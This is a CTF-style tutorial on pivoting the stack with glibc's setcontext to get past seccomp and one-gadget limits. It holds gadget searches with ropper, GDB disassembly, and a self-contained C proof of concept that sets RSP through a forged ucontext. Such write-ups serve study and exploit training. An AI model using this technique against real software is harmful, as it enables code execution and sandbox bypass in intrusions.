# Stack pivoting with setcontext

Usually in CTF challenges we have at our disposal a so named _one gadget_ or _magic gadget_ which allows directlly executing `execve("/bin/sh", 0, 0)` by simply controlling the **RIP**. Sometimes this approach is not reliable by a couple of reasons:

- the constraints for _one gadget_ are not satisfied
- the process is sandboxed using **seccomp** and `execve()` is not allowed

To overcome the situation we can try to pivot the stack to a different location (usually the heap) leveraging a classic ROP chain attack. We'll use `setcontext` to conduct our attack.

PoC source code [here](https://github.com/JustBeYou/ctfs/blob/master/writeups/setcontext_trick.c).

## Preconditions

- GNU/Linux environment with glibc
- Known address to a contigous (writable) region of memory
- Known base of **libc**
- A way to take control of **RIP** and **RDI**

Instead of writing an actual challenge to exploit, we'll focus on implementing the attack directly in C using a single program. Here are the details of my environment, you'll have to change the offsets according to your own:

```c
/**
 * System
 *  Fedora release 31 (Thirty One)
 *  GNU/Linux 5.6.13-200.fc31.x86_64
 *  ldd (GNU libc) 2.30
 *
 * Compile
 *  gcc setcontext_trick.c -g -o setcontext_trick
 */
```

## Overview of setcontext

`setcontext` is a function from libc used to switch (user-level) contexts between threads. You can read more about it on its [man page](https://linux.die.net/man/2/setcontext). The most interesting thing about it is that a context contains a complete copy of machine's registers including **RSP**, so by calling `setcontext` with a well-crafted structure, we can pivot the stack to an arbitrary location.

We have to dig inside `struct ucontext` so we'll know which filed controls the stack pointer.

```c
typedef struct ucontext {
    struct ucontext *uc_link;
    sigset_t         uc_sigmask;
    stack_t          uc_stack;
    mcontext_t       uc_mcontext;
    ...
} ucontext_t;
```

`mcontext_t uc_mcontext` ([source](https://code.woboq.org/userspace/glibc/sysdeps/unix/sysv/linux/x86/sys/ucontext.h.html#133)) field stores the machine state which contains the saved registers.

```c
typedef struct
  {
    gregset_t __ctx(gregs);
    /* Note that fpregs is a pointer.  */
    fpregset_t __ctx(fpregs);
    __extension__ unsigned long long __reserved1 [8];
} mcontext_t;
```

General purpose registers are stored in `gregs` and they have the following order ([source](https://code.woboq.org/userspace/glibc/sysdeps/unix/sysv/linux/x86/sys/ucontext.h.html#gregset_t)):

```c
typedef greg_t gregset_t[__NGREG];
#ifdef __USE_GNU
/* Number of each register in the `gregset_t' array.  */
enum
{
  REG_R8 = 0,
# define REG_R8                REG_R8
  REG_R9,
# define REG_R9                REG_R9

...

# define REG_RSP        REG_RSP // 15th index

...
```

In conclusion, our target is `ucontext_t.uc_mcontext.gregs[REG_RSP]`, where `REG_RSP = 15`.

## Problems with the naive approach

Now, we could try to simply call `setcontext` with a fake structure and take control of **RSP** but this would raise two major problems:

- `setcontext` is using the system call `sigprocmask` and it's very probable to be blocked by `seccomp`
- `setcontext` is reloading FPU x87 environment using `fldenv` so we would need to craft a valid structure for it too

```c
// Naive approach
ucontext_t* ucp = calloc(sizeof(ucontext_t), 1);
ucp->uc_mcontext.gregs[REG_RSP] = 0xcafebabe;

setcontext(ucp);
```

By digging into the [source code](https://code.woboq.org/userspace/glibc/sysdeps/unix/sysv/linux/x86_64/setcontext.S.html#__setcontext) of `setcontext` we can find a way to overcome the limitations of this approach.

Lines [47](https://code.woboq.org/userspace/glibc/sysdeps/unix/sysv/linux/x86_64/setcontext.S.html#47) and [59](https://code.woboq.org/userspace/glibc/sysdeps/unix/sysv/linux/x86_64/setcontext.S.html#59) cause the above mentioned problems. To avoid them, we could jump just after line 60, directly executing the part that reloads general purpose registers. We can find the corresponding offset in the binary by using GDB:

```
(gdb) x/10i setcontext+0x3d
   0x7ffff7e202cd <setcontext+61>:	mov    rsp,QWORD PTR [rdx+0xa0]
   0x7ffff7e202d4 <setcontext+68>:	mov    rbx,QWORD PTR [rdx+0x80]
   0x7ffff7e202db <setcontext+75>:	mov    rbp,QWORD PTR [rdx+0x78]
   0x7ffff7e202df <setcontext+79>:	mov    r12,QWORD PTR [rdx+0x48]
   0x7ffff7e202e3 <setcontext+83>:	mov    r13,QWORD PTR [rdx+0x50]
   0x7ffff7e202e7 <setcontext+87>:	mov    r14,QWORD PTR [rdx+0x58]
   0x7ffff7e202eb <setcontext+91>:	mov    r15,QWORD PTR [rdx+0x60]
   0x7ffff7e202ef <setcontext+95>:	test   DWORD PTR fs:0x48,0x2
   0x7ffff7e202fb <setcontext+107>:	je     0x7ffff7e203b6 <setcontext+294>
   0x7ffff7e20301 <setcontext+113>:	mov    rsi,QWORD PTR [rdx+0x3a8]
```

Unfortunately, another problem arises: the structure was previously loaded into **RDX** and we have control only over **RDI**.

## Controlling RDX

As we already know libc's base we have plenty of gadgets to work with. In this case, we need a gadget that allows setting **RDX** by using **RDI** and then calling a function by a controlled pointer. Using `ropper` and some `grep` trickery, we find just the right thing:

```bash
$ ropper -f /lib64/libc.so.6 --nocolor | grep -E "mov rdx, .*rdi" | grep -E "(call|jmp) qword ptr \[rdx"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
0x000000000012ff3c: add byte ptr [rax], al; add byte ptr [rax], al; mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];
0x000000000012ff3e: add byte ptr [rax], al; mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];
0x000000000012ff40: mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];
```

The gadget at `0x12ff40` is perfect for our use case.

```asm
# rdi should be our controlled buffer
mov rdx, qword ptr [rdi + 8]; # load a controlled value into rdx
mov qword ptr [rsp], rax;
call qword ptr [rdx + 0x20];  # call using a controlled pointer
```

## Crafting the final payload

Using the knowledge we gained above, we can write our proof of concept exploit:

1. Leak and call primitives

```c
size_t leak_libc() {
    return (size_t)stdout - 0x1c3500;
}

void call(void* p, size_t arg) {
    void (*func_ptr)(size_t) = p;
    func_ptr(arg);
}
```

2. Alloc a fake stack and prepare gadgets' addresses

```c
size_t* fake_stack = malloc(0x200);
for (int i = 0; i < 10; i++) fake_stack[i] = 0xdeadbeef;

size_t setcontext_addr = leak_libc() + 0x4c290;
void* load_rdx = (void*)(leak_libc() + 0x12ff40);
```

3. Create the fake context structure and load it

```c
ucontext_t* ucp = calloc(sizeof(ucontext_t), 1);
ucp->uc_mcontext.gregs[REG_RSP] = (size_t)fake_stack; // new stack

size_t* raw_ucp = (size_t*)ucp;
raw_ucp[1] = (size_t)ucp; // [rdi+0x8]  = &ucp => rdx = &ucp
raw_ucp[4] = setcontext_addr + 0x3d;   // [rdx+0x20] = setcontext+0x3d

call(load_rdx, (size_t)ucp);
```

Profit!

```
Program received signal SIGSEGV, Segmentation fault.
0x0000000000000000 in ?? ()
[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────── registers ────
$rax   : 0x0
$rbx   : 0x0
$rcx   : 0x0
$rdx   : 0x0
$rsp   : 0x00000000004052a0  →  0x00000000deadbeef
$rbp   : 0x0
$rsi   : 0x0
$rdi   : 0x0
$rip   : 0x0
$r8    : 0x0
$r9    : 0x0
$r10   : 0x3d0
$r11   : 0x00007ffff7f96a40  →  0x0000000000405870  →  0x0000000000000000
$r12   : 0x0
$r13   : 0x0
$r14   : 0x0
$r15   : 0x0
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
──────────────────── stack ────
0x00000000004052a0│+0x0000: 0x00000000deadbeef   ← $rsp
0x00000000004052a8│+0x0008: 0x00000000deadbeef
0x00000000004052b0│+0x0010: 0x00000000deadbeef
0x00000000004052b8│+0x0018: 0x00000000deadbeef
0x00000000004052c0│+0x0020: 0x00000000deadbeef
0x00000000004052c8│+0x0028: 0x00000000deadbeef
0x00000000004052d0│+0x0030: 0x00000000deadbeef
0x00000000004052d8│+0x0038: 0x00000000deadbeef
────────────────── code:x86:64 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x0
─────────────────── threads ────
[#0] Id 1, Name: "setcontext_tric", stopped 0x0 in ?? (), reason: SIGSEGV
```

Complete source code of PoC [here](https://github.com/JustBeYou/ctfs/blob/master/writeups/setcontext_trick.c).

## Conclusions

We can use this tehnique in a variety of challenges where getting a ROP chain seems impossible, especially in heap challenges where pivoting using a classic `retn` instruction is not an option and `seccomp` does not allow us to execute the _magic gadget_.
